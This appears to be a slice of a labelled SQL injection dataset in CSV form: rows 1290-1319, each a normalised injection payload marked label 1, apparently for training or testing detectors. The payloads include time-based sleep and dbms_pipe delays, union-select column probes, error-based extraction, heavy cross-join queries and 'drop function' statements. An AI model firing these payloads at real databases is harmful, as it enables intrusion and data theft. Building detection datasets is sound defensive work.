row_index,payload_norm,label,sqli_type_hint
1290,"1"" rlike ( select ( case when ( 2724 = 4757 ) then 1 else 0x28 end ) ) and ""cmsa"" = ""cmsa",1,
1291,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and 'lckw' = 'lckw",1,
1292,"1"" ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""kcxw"" = ""kcxw",1,
1293,1 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ),1,
1294,"-1891' in boolean mode ) union all select 6680,6680,6680,6680,6680,6680,6680,6680#",1,
1295,"1%"" ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( ""%"" = """,1,
1296,"1"" ) ) as frsd where 6475 = 6475 union all select null,null,null,null,null,null,null,null,null,null--",1,
1297,if ( 3831 = 9321 ) select 3831 else drop function ybru--,1,
1298,"1"" ) where 9861 = 9861",1,
1299,if ( 3490 = 4920 ) select 3490 else drop function hlzt--,1,
1300,"1 ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",1,
1301,"1"" ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ""pqsp"" = ""pqsp",1,
1302,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- uugg",1,
1303,"1' ) where 3262 = 3262 union all select null,null,null,null,null,null,null,null,null,null#",1,
1304,-2573 ) ) order by 1#,1,
1305,"-2027%"" ) union all select 2048,2048,2048,2048,2048,2048,2048,2048#",1,
1306,1 where 3354 = 3354,1,
1307,"1"" ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ""dtfg"" = ""dtfg",1,
1308,"-3853"" ) where 4626 = 4626 union all select 4626,4626,4626--",1,
1309,"1'+ ( select 'vwzp' where 2729 = 2729 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,
1310,"1' and elt ( 1210 = 1210,sleep ( 5 ) ) and 'ioar' = 'ioar",1,
1311,-3096' or 3821 = 5539 and 'zrth' = 'zrth,1,
1312,1 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) # lwfs,1,
1313,"1 union all select null,null,null,null,null,null,null,null,null--",1,
1314,"1 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) # msrb",1,
1315,"1' and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and 'ulep' = 'ulep",1,
1316,"-5230"" ) or elt ( 1032 = 1032,3623 ) and ( ""aivb"" like ""aivb",1,
1317,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( 'nbzf' like 'nbzf,1,
1318,"-8349 ) union all select 8126,8126#",1,
1319,"1"" ) as buky where 7898 = 7898 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
